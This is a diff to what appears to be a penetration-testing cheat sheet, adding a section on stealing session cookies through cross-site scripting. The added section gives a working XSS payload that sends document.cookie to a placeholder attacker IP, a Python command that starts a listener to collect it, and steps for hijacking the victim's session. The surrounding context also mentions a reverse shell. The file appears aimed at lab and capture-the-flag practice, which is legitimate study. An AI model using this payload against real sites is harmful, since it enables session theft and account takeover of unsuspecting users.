@@ -2973,6 +2973,39 @@ Don't forget to start a reverse shell.
 
 For in depth explaination you can check this [blog](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) out .
 
+## Appendix-VIII - Cookie Stealing using XSS and Escalating Privileges
+
+If there's a xss vulnerability and the owner of the visits it we can steal it's cookie and hijack the session and maybe further escalate the privileges.
+
+we need 2 things :
+  1. xss vulnerable parameter.
+  2. server publicly available
+  3. Victim must visit it.
+
+```note
+Note: if you are solving any vulnerable machine and you are on VPN you don't need public server you can just use your own system and start server on port 8000
+```
+
+If you found a xss vulnerability try to inject the below payload.
+
+### Step - 1
+
+```js
+<img src=x onerror=this.src='http://<YOUR-IP>:8000/?'+document.cookie;>
+```
+
+### Step - 2
+
+Start server on port 8000 we can use python as well as ruby or any other method.
+
+```python
+sudo python2 -m SimpleHTTPServer 8000
+```
+
+### Step - 3
+
+Wait for the victim to visit it, when victim visits it you will be able to see it's session cookie in your system now just replace victim cookie with your own cookie using inspect element or any other tool and refresh and we can finally able to hijack the session.
+
 ## Changelog
 
 ```none
